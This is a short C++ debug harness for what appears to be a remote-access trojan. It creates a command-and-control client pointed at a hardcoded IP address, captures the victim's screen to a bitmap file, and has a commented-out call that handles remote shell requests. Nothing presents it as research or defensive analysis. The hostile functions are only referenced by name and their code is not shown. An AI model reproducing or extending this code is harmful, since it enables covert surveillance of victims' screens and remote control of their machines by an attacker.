#include "cncManager.h"
#include "commandManager.h"
#include <stdlib.h>
#include <iostream>
#include <string>

/* For DEBUG */
int main() {
    commandManager cmd;
    cncManager client(L"1.251.227.66");
    cmd.getScreen("abcd.bmp");
    //client.handleShellRequest(cmd);

}